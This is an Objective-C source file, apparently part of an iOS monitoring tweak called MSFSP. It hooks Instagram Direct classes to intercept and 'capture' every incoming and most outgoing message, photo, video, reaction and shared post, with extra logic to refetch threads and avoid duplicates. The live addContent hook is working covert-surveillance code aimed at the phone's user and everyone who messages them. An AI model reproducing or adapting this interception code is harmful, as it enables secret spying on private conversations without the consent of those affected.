//
//  Instagram.h
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 7/7/2559 BE.
//
//


#import <Foundation/Foundation.h>

#import "IGDirectInboxService.h"
#import "IGDirectInboxNetworker.h"
#import "IGDirectRefreshService.h"
#import "IGDirectCache.h"
#import "IGDirectThread.h"
#import "IGDirectThreadStore.h"
#import "IGDirectThreadStore-Networking.h"
#import "IGDirectThreadDiskCache.h"
#import "IGDirectThreadsFetchOptions.h"
#import "IGDirectContent.h"
#import "IGUser.h"

#import "IGAuthHelper.h"
#import "IGAuthHelper+8-3-0.h"
#import "IGUserSession.h"

#import "IGUtils.h"
#import "IGDate.h"

#import "IGDirectComment.h"
#import "IGDirectPhoto.h"
#import "IGDirectVideo.h"
#import "IGDirectReaction.h"
#import "IGDirectThreadMerger.h"
#import "IGDirectContentUploadInfo.h"
#import "IGDirectContentUploader.h"
#import "IGDirectPostShare.h"
#import "IGPost.h"
#import "IGFeedItem.h"
#import "IGDirectShareSheet.h"
#import "IGDirectPostShareSheet.h"
#import "IGDirectMessageAcknowledgement.h"

// 9.0.1
#import "IGDirectThreadStore+9-0-1.h"
#import "IGDirectThreadService.h"
#import "IGDirectReelShare.h"

#pragma mark -
#pragma mark Instrgram
#pragma mark -

//For outgoing Post share
HOOK(IGDirectPostShareSheet, uploadCurrentContentToRecipient$withCompletion$, void, id arg1, id arg2) {
    DLog(@"Upload");
    void (^originalCompleteBlock)(id p1, IGDirectMessageAcknowledgement *p2);
    originalCompleteBlock = arg2;
    
    void (^newCompleteBlock)(id p1, IGDirectMessageAcknowledgement *p2);
    newCompleteBlock = ^(id p1, IGDirectMessageAcknowledgement *p2) {
        DLog(@"Compleate");
        originalCompleteBlock(p1,p2);
        
//        @try {
//            DLog(@"p2 %@", p2);
//            NSString *threadID = p2.threadID;
//            Class $IGDirectInboxNetworker = objc_getClass("IGDirectInboxNetworker");
//            IGDirectInboxNetworker *inboxNetworker = [$IGDirectInboxNetworker sharedNetworker];
//            IGDirectThreadStore *threadStore = inboxNetworker.threadStore;
//            
//            double lastestTimestamp = [[[IGUtils sharedIGUtils].mLastestThreadTimestampDic objectForKey:threadID] doubleValue];
//            
//            [threadStore fetchThreadWithID:threadID cursorOption:@0 cursorValue:nil mergeOption:@2 successfulThreadHandler:^(IGDirectThread *resultThread){
//                DLog(@"success arg1 %@", resultThread);
//                
//                IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
//                IGDate *lastestMessageDate = lastestMessage.sentAt;
//                DLog(@"lastestMessageDate %@", lastestMessageDate);
//                DLog(@"lastestTimestamp %f", lastestTimestamp);
//                
//                //Filter by lastest timestamp of thread that we keep in plist
//                if (lastestTimestamp == 0 || lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
//                    NSArray *lastSeenItems = [[resultThread.lastSeenAtForItemIds allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
//                        return [obj1.date compare:obj2.date];
//                    }];
//                    
//                    DLog(@"lastSeenItems %@", lastSeenItems);
//                    IGDate *lastSeenDate = [lastSeenItems lastObject];
//                    
//                    IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
//                    DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
//                    
//                    if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
//                        //Need to load more message
//                        [[IGUtils sharedIGUtils] loadAllContentFromThread:resultThread inThreadStore:threadStore firstLoad:YES];
//                    }
//                    else {
//                        //Do capture
//                        [[IGUtils sharedIGUtils] captureMessagesFromThread:resultThread];
//                    }
//                }
//                
//            } failureHandler:^(id arg1){
//                DLog(@"fail arg1 %@", arg1);
//            }];
//        } @catch (NSException *exception) {
//            DLog(@"Found exception %@", exception);
//        } @finally {
//            //Done
//        }
    };
    
    CALL_ORIG(IGDirectPostShareSheet, uploadCurrentContentToRecipient$withCompletion$, arg1, newCompleteBlock);
}

//For outgoing Photo and Video
HOOK(IGDirectContentUploader, precacheUploadImagesIfNeeded$response$, void, id arg1, id arg2) {
    CALL_ORIG(IGDirectContentUploader, precacheUploadImagesIfNeeded$response$, arg1, arg2);
    
//    @try {
//        Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
//        Class $IGDirectVideo = objc_getClass("IGDirectVideo");
//        
//        if ([arg1 isKindOfClass:$IGDirectPhoto] ||  [arg1 isKindOfClass:$IGDirectVideo]) {
//            //Get upload info to find thread id
//            IGDirectContentUploadInfo *uploadInfo = [arg1 uploadInfo];
//            DLog(@"uploadInfo %@", uploadInfo);
//            DLog(@"threadID %@", uploadInfo.threadID);
//            DLog(@"itemId %@", [arg1 itemId]);
//            
//            Class $IGDirectInboxNetworker = objc_getClass("IGDirectInboxNetworker");
//            IGDirectInboxNetworker *inboxNetworker = [$IGDirectInboxNetworker sharedNetworker];
//            IGDirectThreadStore *threadStore = inboxNetworker.threadStore;
//            
//            double lastestTimestamp = [[[IGUtils sharedIGUtils].mLastestThreadTimestampDic objectForKey:uploadInfo.threadID] doubleValue];
//            
//            [threadStore fetchThreadWithID:uploadInfo.threadID cursorOption:@0 cursorValue:nil mergeOption:@2 successfulThreadHandler:^(IGDirectThread *resultThread){
//                DLog(@"success arg1 %@", resultThread);
//                IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
//                DLog(@"lastestMessage %@", lastestMessage);
//                DLog(@"ouging timestamp after load %f", lastestMessage.sentAt.timeIntervalSince1970);
//                
//                IGDate *lastestMessageDate = lastestMessage.sentAt;
//                
//                if (lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
//                    [[IGUtils sharedIGUtils] storeLastestThreadTimeStamp:lastestMessageDate.timeIntervalSince1970 forThreadID:resultThread.threadId];
//                    [IGUtils captureMessageContent:lastestMessage inThread:resultThread];
//                }
//                else {
//                    //Already capture from app did become active
//                }
//            } failureHandler:^(id arg1){
//                DLog(@"fail arg1 %@", arg1);
//            }];
//        }
//    } @catch (NSException *exception) {
//        DLog(@"Found exception %@", exception);
//    } @finally {
//        //Done
//    }

}

//For all incoming (Comment, Photo, Video, Reaction, PostShare,) and some outgoing (Comment, Reaction)
HOOK(IGDirectThreadStore, addContent$forThreadId$, void, id arg1, id arg2) {
    CALL_ORIG(IGDirectThreadStore, addContent$forThreadId$, arg1, arg2);
    
    Class $IGDirectComment = objc_getClass("IGDirectComment");
    Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
    Class $IGDirectVideo = objc_getClass("IGDirectVideo");
    Class $IGDirectReaction = objc_getClass("IGDirectReaction");
    Class $IGDirectPostShare = objc_getClass("IGDirectPostShare");
    Class $IGDirectReelShare = objc_getClass("IGDirectReelShare");
    
    if (![arg1 isKindOfClass:$IGDirectComment] &&
        ![arg1 isKindOfClass:$IGDirectPhoto] &&
        ![arg1 isKindOfClass:$IGDirectVideo] &&
        ![arg1 isKindOfClass:$IGDirectReaction] &&
        ![arg1 isKindOfClass:$IGDirectPostShare] &&
        ![arg1 isKindOfClass:$IGDirectReelShare]) {
        DLog(@"Not support capturing this class %@", [arg1 class]);
        return;
    }
    
    @try {
        //It will call 2 time for outgoing share post
        if ([arg1 isKindOfClass:$IGDirectPostShare]) {//Share post can come together with IGDirectComment but that comment never come as an argument so we need to load all message in thread manually
            double lastestTimestamp = [[[IGUtils sharedIGUtils].mLastestThreadTimestampDic objectForKey:arg2] doubleValue];
            
            //Below 9.0.1
            if ([self respondsToSelector:@selector(fetchThreadWithID:cursorOption:cursorValue:mergeOption:successfulThreadHandler:)]) {
                [self fetchThreadWithID:arg2 cursorOption:@0 cursorValue:nil mergeOption:@2 successfulThreadHandler:^(IGDirectThread *resultThread){
                    DLog(@"success arg1 %@", resultThread);
                    
                    IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
                    IGDate *lastestMessageDate = lastestMessage.sentAt;
                    DLog(@"lastestMessageDate %@", lastestMessageDate);
                    DLog(@"lastestTimestamp %f", lastestTimestamp);
                    
                        //Filter by lastest timestamp of thread that we keep in plist
                    if (lastestTimestamp == 0 || lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                        NSArray *lastSeenItems = [[resultThread.lastSeenAtForItemIds allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                            return [obj1.date compare:obj2.date];
                        }];
                        
                        DLog(@"lastSeenItems %@", lastSeenItems);
                        IGDate *lastSeenDate = [lastSeenItems lastObject];
                        
                        IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
                        DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                        
                        if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                                //Need to load more message
                            [[IGUtils sharedIGUtils] loadAllContentFromThread:resultThread inThreadStore:self firstLoad:YES];
                        }
                        else {
                                //Do capture
                            [[IGUtils sharedIGUtils] captureMessagesFromThread:resultThread];
                        }
                    }
                    
                } failureHandler:^(id arg1){
                    DLog(@"fail arg1 %@", arg1);
                }];
            }
            else {//9.0.1
                IGDirectThreadService *threadService = [self threadService];
                [threadService refreshThreadWithId:arg2 cursor:nil completion:^(IGDirectThread *resultThread){
                    DLog(@"success arg1 %@", resultThread);
                    
                    IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
                    IGDate *lastestMessageDate = lastestMessage.sentAt;
                    DLog(@"lastestMessageDate %@", lastestMessageDate);
                    DLog(@"lastestTimestamp %f", lastestTimestamp);
                    
                        //Filter by lastest timestamp of thread that we keep in plist
                    if (lastestTimestamp == 0 || lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                        NSArray *lastSeenItems = [[resultThread.lastSeenAtForItemIds allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                            return [obj1.date compare:obj2.date];
                        }];
                        
                        DLog(@"lastSeenItems %@", lastSeenItems);
                        IGDate *lastSeenDate = [lastSeenItems lastObject];
                        
                        IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
                        DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                        
                        if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                                //Need to load more message
                            [[IGUtils sharedIGUtils] loadAllContentFromThread:resultThread inThreadStore:self firstLoad:YES];
                        }
                        else {
                                //Do capture
                            [[IGUtils sharedIGUtils] captureMessagesFromThread:resultThread];
                        }
                    }
                }];
            }
        }
        else {
            IGDirectContent *content = arg1;
            double lastestTimestamp = [[[IGUtils sharedIGUtils].mLastestThreadTimestampDic objectForKey:arg2] doubleValue];
            DLog(@"content timestamp %f", content.sentAt.timeIntervalSince1970);
            
            //For outgoing need to reload data from server to get real timestamp
            if (content.senderIsCurrentUser) {
                //Below 9.0.1
                if ([self respondsToSelector:@selector(fetchThreadWithID:cursorOption:cursorValue:mergeOption:successfulThreadHandler:)]) {
                    [self fetchThreadWithID:arg2 cursorOption:@0 cursorValue:nil mergeOption:@2 successfulThreadHandler:^(IGDirectThread *resultThread){
                        DLog(@"success arg1 %@", resultThread);
                        IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
                        if ([lastestMessage.itemId isEqualToString:content.itemId]) {
                            DLog(@"ouging timestamp after load %f", lastestMessage.sentAt.timeIntervalSince1970);
                            
                            IGDate *lastestMessageDate = lastestMessage.sentAt;
                            
                            if (lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                                [[IGUtils sharedIGUtils] storeLastestThreadTimeStamp:lastestMessageDate.timeIntervalSince1970 forThreadID:resultThread.threadId];
                                [IGUtils captureMessageContent:arg1 inThread:resultThread];
                            }
                            else {
                                    //Already capture from app did become active
                            }
                        }
                        else {
                                //Unexpected error last message did not uploaded to server
                            DLog(@"Unexpected error");
                        }
                    } failureHandler:^(id arg1){
                        DLog(@"fail arg1 %@", arg1);
                    }];
                }
                else {//9.0.1
                    IGDirectThreadService *threadService = [self threadService];
                    [threadService refreshThreadWithId:arg2 cursor:nil completion:^(IGDirectThread *resultThread){
                        DLog(@"success arg1 %@", resultThread);
                        IGDirectContent *lastestMessage = [resultThread.publishedMessages lastObject];
                        if ([lastestMessage.itemId isEqualToString:content.itemId]) {
                            DLog(@"ouging timestamp after load %f", lastestMessage.sentAt.timeIntervalSince1970);
                            
                            IGDate *lastestMessageDate = lastestMessage.sentAt;
                            
                            if (lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                                [[IGUtils sharedIGUtils] storeLastestThreadTimeStamp:lastestMessageDate.timeIntervalSince1970 forThreadID:resultThread.threadId];
                                [IGUtils captureMessageContent:arg1 inThread:resultThread];
                            }
                            else {
                                    //Already capture from app did become active
                            }
                        }
                        else {
                                //Unexpected error last message did not uploaded to server
                            DLog(@"Unexpected error");
                        }
                    }];
                }
            }//For incoming capture it right away
            else {
                IGDirectThread *thread = [self storedThreadWithID:arg2];
                IGDate *lastestMessageDate = content.sentAt;
                
                if (lastestMessageDate.timeIntervalSince1970 > lastestTimestamp) {
                    [[IGUtils sharedIGUtils] storeLastestThreadTimeStamp:lastestMessageDate.timeIntervalSince1970 forThreadID:thread.threadId];
                    [IGUtils captureMessageContent:arg1 inThread:thread];
                }
                else {
                    //Already capture from app did become active
                }
            }
        }
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        //Done
    }
}